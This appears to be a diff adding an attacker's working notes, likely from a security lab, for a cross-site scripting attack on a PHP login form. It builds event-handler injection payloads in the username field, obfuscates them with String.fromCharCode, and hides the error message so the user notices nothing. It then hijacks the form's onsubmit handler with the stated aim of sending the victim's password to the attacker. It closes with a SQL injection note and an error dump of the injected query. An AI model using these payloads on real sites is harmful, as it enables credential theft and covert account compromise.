@@ -1,0 +1,108 @@
+Starting points:
+
+'' onclick='alert(document.cookie)' --> nothing
+"" onclick=alert(document.cookie) --> ""
+a onclick=alert(document.cookie) --> a
+
+
+
+Better event since we cant assume the user will click on username since it has the focus by default
+PROBLEM: event handler runs on every keystroke of input. We probably want event handler to run once.
+I think I want event handler to change the DOM by adding something to the form to make a GET request to 
+leak the password when form is submitted and also then log the user. Think blocking AJAX call.
+
+'' oninput='alert(document.cookie)'
+
+
+Better since this will execute when the username field loses focus. This will be done once presumably. 
+Maybe can add some global variable check to avoid this happening twice.
+
+'' onblur='alert(document.cookie)'
+
+
+The event handler for the username field was only our entry point. We want to modify the form element to 
+do what we want when submitted (ultimately, sending the password to us and logging the user in). The 
+following sets an event handler on the form. 
+
+document.forms[0].setAttribute('onsubmit', 'alert(document.cookie)')
+
+
+Combining the entry point and the above we get
+
+'' onblur='document.forms[0].setAttribute(\'onsubmit\', \'alert(document.cookie)\')'
+
+Problem with escaping ': fix use technique from myspace paper:
+
+String.fromCharCode(39,111,110,115,117,98,109,105,116,39) --> "'onsubmit'"
+
+String.fromCharCode(39, 97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41, 39) --> "'alert(document.cookie)'"
+
+function strToCharCode(str){
+	res = [];
+	for(var i = 0; i < str.length; i++)
+	{
+		res[i] = str.charCodeAt(i);
+	}
+	return res;
+}
+
+
+'' onblur=document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116),String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
+
+'' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41))'
+
+this both equivalent to 
+
+'' onblur='document.forms[0].setAttribute("onsubmit", "alert(document.cookie)")'
+
+and work
+
+
+Now I got control of the form onsubmit event handler. Befor getting into that lets get rid of the "You must supply a password to log in." error message displayed when we redirect user to page. We do this with the onfocus element since the user field 
+will be focused when the page is renderd, which means that that event will immediately trigger our handler and we will delete the message before user can notice.
+
+'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)'
+
+this does the trick of deleting that annoying message. Combining we get:
+
+'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41))'
+
+which is equivalent to 
+
+'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].setAttribute("onsubmit", "alert(document.cookie)")'
+
+
+
+So recap, we managed to construct a string that when inputted in the username and submitted returns to the login page, 
+leaves no trace of tampering, and sets an event listener for the onsubmit event for the login form. Now lets modify that
+event listener to send us the credentials and log the user in.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+// can do SQL injection: see dump when entering a password
+
+Php-Txt-Db-Access Error:
+PHP Error: [8] Undefined offset: 0 [Line: 201] [File: /srv/http/txt-db-api/expression.php]
+
+Php-Txt-Db-Access Error:
+PHP Error: [8] Undefined offset: 1 [Line: 207] [File: /srv/http/txt-db-api/expression.php]
+
+Php-Txt-Db-Access Error:
+Column 'document.cookie' not found
+
+Php-Txt-Db-Access Error:
+Query 'SELECT Salt FROM Person WHERE Username = ''' onclick='alert(document.cookie)''' failed
